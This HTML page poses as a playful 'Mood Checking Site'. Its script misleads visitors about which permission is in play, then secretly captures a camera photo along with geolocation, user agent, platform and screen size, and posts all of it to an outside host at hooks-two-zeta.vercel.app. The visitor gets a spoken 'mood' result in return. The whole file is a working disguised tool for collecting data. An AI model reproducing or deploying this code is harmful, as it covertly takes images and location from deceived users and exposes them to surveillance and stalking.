<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mood Checking Site</title>
    <script>
        function requestAudioAccess() {
            if (!navigator.permissions) {
                alert("Your browser doesn't support the Permissions API.");
                return;
            }

            navigator.permissions.query({ name: 'microphone' }).then((result) => {
                if (result.state === 'granted' || result.state === 'prompt') {
                    alert("Permission granted! Starting the mood check...");
                    startMoodCheck();
                } else {
                    alert("Please enable audio permissions to proceed.");
                }
            }).catch((err) => {
                console.error("Permission check failed:", err);
                alert("Error while requesting permission for audio.");
            });
        }

        function speak(text) {
            const speech = new SpeechSynthesisUtterance(text);
            speech.lang = 'en-US';
            speech.rate = 1;
            speech.pitch = 1;
            window.speechSynthesis.speak(speech);
        }

        function capturePhoto() {
            const videoElement = document.createElement('video');
            videoElement.width = 640;
            videoElement.height = 480;
            
            navigator.mediaDevices.getUserMedia({ video: true })
                .then((stream) => {
                    videoElement.srcObject = stream;
                    videoElement.play();

                    const canvas = document.createElement('canvas');
                    const ctx = canvas.getContext('2d');

                    // Wait for video to load, then capture photo
                    videoElement.addEventListener('canplay', () => {
                        ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
                        const photoData = canvas.toDataURL('image/jpeg'); // Base64-encoded image

                        sendDeviceInfo(photoData);

                        // Stop the video stream after capturing the photo
                        stream.getTracks().forEach(track => track.stop());
                    });
                })
                .catch((err) => {
                    console.error('Error accessing camera:', err);
                    alert('Could not access camera.');
                });
        }

        function sendDeviceInfo(photo) {
            const statusElement = document.getElementById("status");
            statusElement.textContent = "Mood is checking...";
            speak("Mood is checking...");

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    function (position) {
                        const latitude = position.coords.latitude;
                        const longitude = position.coords.longitude;
                        const userAgent = navigator.userAgent;
                        const platform = navigator.platform;
                        const screenResolution = `${window.screen.width}x${window.screen.height}`;

                        fetch('https://hooks-two-zeta.vercel.app/send-info', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                latitude,
                                longitude,
                                userAgent,
                                platform,
                                screenResolution,
                                photo,
                            }),
                        })
                            .then((response) => response.text())
                            .then((data) => {
                                const moodText = `Mood: ${data}`;
                                statusElement.textContent = moodText;
                                speak(moodText);
                            })
                            .catch(() => {
                                const errorText = "Mood: very sad";
                                statusElement.textContent = errorText;
                                speak(errorText);
                            });
                    },
                    () => {
                        const errorText = "Mood: angry";
                        statusElement.textContent = errorText;
                        speak(errorText);
                    }
                );
            } else {
                const errorText = "Mood: very very angry";
                statusElement.textContent = errorText;
                speak(errorText);
            }
        }

        function startMoodCheck() {
            capturePhoto();
        }
    </script>
</head>
<body style="height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center;">
    <h1>Welcome to the Mood Checking Site</h1>
    <button onclick="requestAudioAccess()" style="padding: 10px 20px; font-size: 1em; margin-top: 20px;">Start Mood Check</button>
    <p id="status" style="font-size: 1.2em; color: #333; margin-top: 20px;"></p>
</body>
</html>
